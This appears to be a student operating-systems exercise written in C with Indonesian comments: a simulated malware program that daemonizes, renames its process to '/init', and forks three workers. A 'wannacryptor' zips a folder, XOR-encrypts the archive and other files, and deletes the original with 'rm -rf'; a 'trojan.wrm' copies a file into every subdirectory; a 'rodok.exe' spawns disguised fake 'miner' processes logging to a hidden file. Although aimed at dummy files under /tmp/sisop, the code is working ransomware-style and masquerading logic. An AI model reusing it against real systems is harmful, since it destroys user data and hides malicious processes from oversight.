#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <time.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include <errno.h>
#include <signal.h>
#include <sys/wait.h>
void set_process_name(char **argv, const char *name) {
    size_t len = strlen(argv[0]);
    size_t new_len = strlen(name);
    strncpy(argv[0], name, len); 
    if (new_len < len) {
        memset(argv[0] + new_len, 0, len - new_len); 
    }
    prctl(PR_SET_NAME, name); 
}

// Fungsi untuk membuat file dengan konten dummy
void create_file(const char *path, const char *content) {
    FILE *file = fopen(path, "w");
    if (file) {
        fprintf(file, "%s\n", content);
        fclose(file);
    } else {
        fprintf(stderr, "Gagal membuat file %s: %s\n", path, strerror(errno));
    }
}

// Fungsi untuk enkripsi XOR sederhana
void encrypt_file(const char *path, time_t key) {
    FILE *file = fopen(path, "rb+");
    if (!file) {
        fprintf(stderr, "Gagal membuka file %s untuk enkripsi: %s\n", path, strerror(errno));
        return;
    }

    fseek(file, 0, SEEK_END);
    long size = ftell(file);
    if (size == 0) {
        fclose(file);
        return; 
    }
    rewind(file);

    char *buffer = malloc(size);
    if (!buffer) {
        fprintf(stderr, "Gagal alokasi memori untuk file %s\n", path);
        fclose(file);
        return;
    }

    fread(buffer, 1, size, file);
    for (long i = 0; i < size; i++) {
        buffer[i] ^= key & 0xFF; // XOR dengan timestamp (hanya byte terendah)
    }
    rewind(file);
    fwrite(buffer, 1, size, file);
    fclose(file);
    free(buffer);
    printf("File %s berhasil dienkripsi\n", path);
}

// Wannacryptor: Meng-zip folder, mengenkripsi ZIP, lalu menghapus folder asli
void wannacryptor(const char *base_path, time_t key, char **argv) {
    set_process_name(argv, "wannacryptor");
    sleep(1); // Berikan waktu untuk nama proses diatur
    fprintf(stderr, "wannacryptor dimulai\n");
    sleep(10); 

    // Direktori induk
    char parent_dir[256];
    strcpy(parent_dir, base_path);
    char *last_slash = strrchr(parent_dir, '/');
    if (last_slash) {
        *last_slash = '\0'; // Potong path ke parent directory
    } else {
        strcpy(parent_dir, "."); // Jika tidak ada slash, gunakan current directory
    }

    char target_folder[256];
    strcpy(target_folder, base_path);
    char *folder_name = strrchr(target_folder, '/');
    if (folder_name) {
        folder_name++; // Arahkan ke nama folder setelah slash terakhir
    } else {
        folder_name = target_folder; 
    }

    char zip_path[256];
    snprintf(zip_path, sizeof(zip_path), "%s/%s.zip", parent_dir, folder_name);

    struct stat st;
    if (stat(base_path, &st) == 0 && S_ISDIR(st.st_mode)) {
        
        char command[512];
        snprintf(command, sizeof(command), "cd %s && zip -r %s.zip %s", parent_dir, folder_name, folder_name);
        printf("Menjalankan: %s\n", command);

        int ret = system(command);
        if (ret == 0) {
            // Enkripsi file zip
            encrypt_file(zip_path, key);

            // Hapus folder asli
            snprintf(command, sizeof(command), "rm -rf %s", base_path);
            printf("Menghapus folder: %s\n", command);
            system(command);
            printf("Wannacryptor berhasil: %s -> %s (encrypted)\n", base_path, zip_path);
        } else {
            fprintf(stderr, "Gagal membuat ZIP untuk %s: %d\n", base_path, ret);
        }
    }

    DIR *dir = opendir(parent_dir);
    if (!dir) {
        fprintf(stderr, "Gagal membuka direktori %s: %s\n", parent_dir, strerror(errno));
        return; 
    }

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
        if (strcmp(entry->d_name, "malware_executable") == 0) continue; 
        if (strstr(entry->d_name, ".zip") != NULL) continue; 

        char file_path[256];
        snprintf(file_path, sizeof(file_path), "%s/%s", parent_dir, entry->d_name);

        struct stat file_stat;
        if (stat(file_path, &file_stat) != 0) continue;

        if (S_ISREG(file_stat.st_mode)) { // Hanya enkripsi file regular
            encrypt_file(file_path, key);
        }
    }
    closedir(dir);

    // Untuk debugging, kita buat wannacryptor hanya berjalan sekali
    // while (1) {
    //     sleep(30); // Tunggu 30 detik sebelum iterasi berikutnya
    // }
}

// Trojan.wrm: Menyalin file malware ke subdirektori
void trojan_wrm(const char *base_path, const char *malware_source, int depth, char **argv) {
    if (depth > 5) { // Batasi kedalaman rekursi untuk mencegah stack overflow
        fprintf(stderr, "Kedalaman rekursi trojan.wrm terlalu dalam, berhenti\n");
        return;
    }

    set_process_name(argv, "trojan.wrm");
    sleep(1); // Berikan waktu untuk nama proses diatur
    fprintf(stderr, "trojan.wrm dimulai (depth: %d)\n", depth);

    while (1) { // Loop setiap 30 detik
        DIR *dir = opendir(base_path);
        if (!dir) {
            fprintf(stderr, "Gagal membuka direktori %s: %s\n", base_path, strerror(errno));
            sleep(30);
            continue;
        }

        struct dirent *entry;

        while ((entry = readdir(dir)) != NULL) {
            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;

            char full_path[256];
            snprintf(full_path, sizeof(full_path), "%s/%s", base_path, entry->d_name);

            struct stat statbuf;
            if (stat(full_path, &statbuf) != 0) continue;

            if (S_ISDIR(statbuf.st_mode)) {
                char dest_path[256];
                snprintf(dest_path, sizeof(dest_path), "%s/malware_copy", full_path);

                // Buat salinan malware
                FILE *src = fopen(malware_source, "rb");
                if (!src) {
                    fprintf(stderr, "Gagal membuka source malware %s: %s\n", malware_source, strerror(errno));
                    continue;
                }

                FILE *dst = fopen(dest_path, "wb");
                if (!dst) {
                    fprintf(stderr, "Gagal membuat file %s: %s\n", dest_path, strerror(errno));
                    fclose(src);
                    continue;
                }

                char buffer[1024];
                size_t bytes;
                while ((bytes = fread(buffer, 1, sizeof(buffer), src)) > 0) {
                    fwrite(buffer, 1, bytes, dst);
                }

                fclose(src);
                fclose(dst);
                printf("Malware disalin ke %s\n", dest_path);

                // Rekursif ke subdirektori
                trojan_wrm(full_path, malware_source, depth + 1, argv);
            }
        }
        closedir(dir);
        fprintf(stderr, "trojan.wrm masih berjalan (depth: %d)\n", depth);
        sleep(30); // Tunggu 30 detik sebelum iterasi berikutnya
    }
}

// Fungsi untuk menghasilkan hash acak 64 karakter
void generate_hash(char *hash) {
    const char *hex = "0123456789abcdef";
    for (int i = 0; i < 64; i++) {
        hash[i] = hex[rand() % 16];
    }
    hash[64] = '\0';
}

// Rodok_exe: Fork bomb dan logging ke /tmp/.miner.log
void rodok_exe(char **argv) {
    set_process_name(argv, "rodok.exe");
    sleep(1); // Berikan waktu untuk nama proses diatur
    fprintf(stderr, "rodok.exe dimulai\n");

    // Set process group ID untuk rodok_exe dan semua anaknya
    setpgid(0, 0);

    // Pastikan /tmp/.miner.log dapat dibuat
    FILE *test_log = fopen("/tmp/.miner.log", "a");
    if (!test_log) {
        mkdir("/tmp", 0755);
        test_log = fopen("/tmp/.miner.log", "a");
        if (!test_log) {
            fprintf(stderr, "Gagal membuat /tmp/.miner.log: %s\n", strerror(errno));
        } else {
            fclose(test_log);
        }
    } else {
        fclose(test_log);
    }

    int max_forks = 3;
    for (int i = 0; i < max_forks; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            // Proses anak (mine-crafter-XX)
            setpgid(0, getppid()); // Masukkan ke process group yang sama dengan rodok_exe

            char miner_name[32];
            snprintf(miner_name, sizeof(miner_name), "mine-crafter-%d", i);
            set_process_name(argv, miner_name);
            sleep(1); // Berikan waktu untuk nama proses diatur
            fprintf(stderr, "%s dimulai\n", miner_name);

            srand(time(NULL) ^ (getpid() << 16)); // Inisialisasi random seed

            while (1) {
                int sleep_time = rand() % 28 + 3; // Sleep 3-30 detik
                char hash[65];
                generate_hash(hash);

                FILE *log = fopen("/tmp/.miner.log", "a");
                if (log) {
                    time_t now = time(NULL);
                    char timestamp[20];
                    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
                    fprintf(log, "[%s][%s] %s\n", timestamp, miner_name, hash);
                    fclose(log);
                } else {
                    fprintf(stderr, "Gagal membuka /tmp/.miner.log: %s\n", strerror(errno));
                    // Jangan exit, lanjutkan tanpa logging
                }

                fprintf(stderr, "%s masih berjalan\n", miner_name);
                sleep(sleep_time);
            }
            exit(0); // Jangan lupa exit dari proses anak
        } else if (pid > 0) {
            // Proses induk (rodok_exe)
            setpgid(pid, getpid()); 
        } else {
            fprintf(stderr, "Fork gagal untuk mine-crafter-%d: %s\n", i, strerror(errno));
            exit(1);
        }
    }

    // Tunggu sinyal atau loop
    while (1) {
        fprintf(stderr, "rodok.exe masih berjalan\n");
        sleep(30);
    }
}

int main(int argc, char *argv[]) {
    // Jadikan daemon
    pid_t pid = fork();
    if (pid > 0) {
        exit(0); // Parent keluar
    }
    if (pid < 0) {
        fprintf(stderr, "Fork gagal: %s\n", strerror(errno));
        exit(1);
    }
    setsid();

    // Set process group ID untuk proses utama dan semua anaknya
    setpgid(0, 0);

    // Redirect stdout dan stderr ke file untuk debugging
    FILE *log_file = fopen("/tmp/malware.log", "a");
    if (!log_file) {
        fprintf(stderr, "Gagal membuka /tmp/malware.log: %s\n", strerror(errno));
        exit(1);
    }
    dup2(fileno(log_file), STDOUT_FILENO);
    dup2(fileno(log_file), STDERR_FILENO);
    fclose(log_file);

    // Ganti nama proses utama
    set_process_name(argv, "/init");
    sleep(1); // Berikan waktu untuk nama proses diatur
    fprintf(stderr, "/init dimulai\n");
    const char *base_dir = "/tmp"; // Direktori tempat semua file berada

    // Path target dan malware
    char test_path[256];
    char malware_executable_path[256];
    char randomfile_path[256];
    char file1_path[256];
    char file2_path[256];
    char randfolder_path[256];
    char test_file_path[256];
    char test2_file_path[256];
    char test3_file_path[256];

    snprintf(test_path, sizeof(test_path), "%s/sisop/test", base_dir);
    snprintf(malware_executable_path, sizeof(malware_executable_path), "%s/sisop/malware_executable", base_dir);
    snprintf(randomfile_path, sizeof(randomfile_path), "%s/sisop/randomfile", base_dir);
    snprintf(file1_path, sizeof(file1_path), "%s/sisop/test/file1", base_dir);
    snprintf(file2_path, sizeof(file2_path), "%s/sisop/test/file2", base_dir);
    snprintf(randfolder_path, sizeof(randfolder_path), "%s/sisop/test/randfolder", base_dir);
    snprintf(test_file_path, sizeof(test_file_path), "%s/sisop/test/randfolder/test", base_dir);
    snprintf(test2_file_path, sizeof(test2_file_path), "%s/sisop/test/randfolder/test2", base_dir);
    snprintf(test3_file_path, sizeof(test3_file_path), "%s/sisop/test/randfolder/test3", base_dir);

    // Pastikan directory base ada
    if (mkdir("/tmp/sisop", 0755) != 0 && errno != EEXIST) {
        fprintf(stderr, "Gagal membuat direktori /tmp/sisop: %s\n", strerror(errno));
        exit(1);
    }
    if (mkdir("/tmp/sisop/test", 0755) != 0 && errno != EEXIST) {
        fprintf(stderr, "Gagal membuat direktori /tmp/sisop/test: %s\n", strerror(errno));
        exit(1);
    }
    if (mkdir("/tmp/sisop/test/randfolder", 0755) != 0 && errno != EEXIST) {
        fprintf(stderr, "Gagal membuat direktori /tmp/sisop/test/randfolder: %s\n", strerror(errno));
        exit(1);
    }

    create_file(malware_executable_path, "Ini malware dummy yang sangat menyeramkan.");


    create_file(randomfile_path, "This is a random file");

    create_file(file1_path, "This is file1");
    create_file(file2_path, "This is file2");

    // Buat file test, test2, test3 di dalam randfolder
    create_file(test_file_path, "This is test file in randfolder");
    create_file(test2_file_path, "This is test2 file in randfolder");
    create_file(test3_file_path, "This is test3 file in randfolder");


    // Proses Wannacryptor
    pid = fork();
    if (pid == 0) {
        setpgid(0, getppid()); // Masukkan ke process group yang sama dengan /init
        wannacryptor(test_path, time(NULL), argv);
        exit(0);
    } else if (pid > 0) {
        setpgid(pid, getpid()); // Pastikan anak berada di process group yang sama
    } else {
        fprintf(stderr, "Fork gagal untuk wannacryptor: %s\n", strerror(errno));
        exit(1);
    }

    // Proses Trojan.wrm
    pid = fork();
    if (pid == 0) {
        setpgid(0, getppid()); // Masukkan ke process group yang sama dengan /init
        trojan_wrm(test_path, malware_executable_path, 0, argv);
        exit(0);
    } else if (pid > 0) {
        setpgid(pid, getpid()); // Pastikan anak berada di process group yang sama
    } else {
        fprintf(stderr, "Fork gagal untuk trojan.wrm: %s\n", strerror(errno));
        exit(1);
    }

    // Proses Rodok_exe
    pid = fork();
    if (pid == 0) {
        setpgid(0, getppid()); 
        rodok_exe(argv);
        exit(0);
    } else if (pid > 0) {
        setpgid(pid, getpid()); // Pastikan anak berada di process group yang sama
    } else {
        fprintf(stderr, "Fork gagal untuk rodok.exe: %s\n", strerror(errno));
        exit(1);
    }

    while (1) {
        // Bersihkan proses anak yang sudah selesai (zombie)
        pid_t finished_pid = waitpid(-1, NULL, WNOHANG);
        if (finished_pid > 0) {
            fprintf(stderr, "Proses anak dengan PID %d selesai\n", finished_pid);
        } else if (finished_pid == -1 && errno != ECHILD) {
            fprintf(stderr, "waitpid gagal: %s\n", strerror(errno));
        }
        fprintf(stderr, "/init masih berjalan\n");
        sleep(30);
    }

    return 0;
}